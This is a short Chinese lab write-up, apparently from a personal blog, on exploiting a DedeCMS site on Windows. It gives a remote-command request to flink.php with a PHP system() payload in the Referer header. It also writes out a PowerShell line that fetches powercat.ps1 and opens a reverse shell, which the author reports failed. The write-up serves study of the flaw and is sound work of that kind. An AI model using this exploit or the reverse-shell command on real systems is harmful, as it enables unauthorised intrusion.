ailx10说：这篇是我2024年8月写的。这次织梦环境在 Windows 上，我通过 flink.php 的请求和 Referer 里的内容做验证，简单命令能看到回显，换到 PowerShell 连接却没成功。原本看着一步之遥，实际上编码、命令行和运行环境都可能让结果变掉。我就把成功的小命令和失败的大动作一起记下来，没有让后者消失。它提醒我，一条能执行的入口不代表任何复杂脚本都能照搬过去；先把每个组成部分分开试，至少能知道自己卡在解析、权限还是网络这段。

---

我的网站跑在windows系统上，因此构建的命令都是windows下的命令:

```
http://192.168.0.110/plus/flink.php?dopost=save&c=ipconfig
```

请求头中的 Referer 载荷：

```
<?php "system"($c);die;/*
```

![](/notes-assets/ecfbf0c31fec41609d84.webp)

访问这个URL，就能在返回的HTML源代码中查看到 ipconfig 执行的结果，如果是linux系统就是 ifconfig，一字之差，最稳妥的方式是输入whoami命令，在windows和linux中都有运行结果

![](/notes-assets/38738aa1ab5757f81e3f.webp)

但是我想执行 windows 反弹shell，确是失败的

```
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.104:8000/powercat.ps1');powercat -c 192.168.0.107 -p 6666 -e cmd
```

![](/notes-assets/75b12f0015c215aec7aa.webp)

正常的 windows 反弹shell是下面这样的

![](/notes-assets/aa9069145f140b591d2a.webp)

失败的一段没有被删掉，因为它正是后续排查的起点。命令怎样传入、如何被解释、网络有没有通，都需要各自的证据，而不是在最后只留下一个“已拿下”的标题。
